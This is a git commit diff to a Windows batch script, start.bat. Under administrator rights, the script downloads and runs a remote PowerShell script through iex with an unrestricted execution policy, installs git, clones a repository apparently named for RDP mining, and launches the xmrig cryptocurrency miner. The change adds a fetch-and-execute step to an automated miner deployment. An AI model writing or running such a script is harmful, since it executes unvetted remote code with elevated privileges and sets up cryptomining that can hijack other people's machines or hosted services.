8c61f01ea30d76f593e329c8235a01df429be558
Sueqkjs <68449029+Sueqkjs@users.noreply.github.com>
2021-10-11 15:37:03 +0900

    ok

--- start.bat
+++ start.bat
@@ -4,7 +4,8 @@ net session >nul 2>&1
 
 if %ERRORLEVEL% equ 0 (
   echo processing....
-  winget install git
+  @powershell -NoProfile -ExecutionPolicy unrestricted -Command "iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))" && SET PATH=%PATH%;%systemdrive%\chocolatey\bin
+  cinst git
   git clone https://github.com/Sueqkjs/rdprig
   cd rdprig
   xmrig.exe
